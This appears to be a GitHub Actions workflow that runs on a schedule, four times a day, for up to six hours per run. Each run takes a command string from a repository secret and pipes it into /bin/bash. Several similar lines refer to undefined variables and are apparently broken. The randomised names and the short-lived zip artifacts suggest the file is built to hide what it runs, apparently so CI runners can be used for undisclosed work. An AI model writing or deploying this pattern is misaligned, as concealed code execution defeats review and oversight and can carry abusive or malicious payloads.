name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '7 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  main:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          tt5: ${{ secrets.tt5 }}
        run: |
          printf '%s' "$tt5" | jq -r .yr65 | /bin/bash
          printf '%s' "$fyc12" | jq -r .xof7726 | /bin/bash
          printf '%s' "$gppdh0898" | jq -r .apf8648 | /bin/bash
          printf '%s' "$lljkl2" | jq -r .rzoiy7 | /bin/bash
          printf '%s' "$ms5087" | jq -r .twflv3534 | /bin/bash
          printf '%s' "$oxq93" | jq -r .phe5951 | /bin/bash
          echo $f21281 | jq -r .v84891 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: bRgLPVJq
          path: "*.zip"
          retention-days: 1
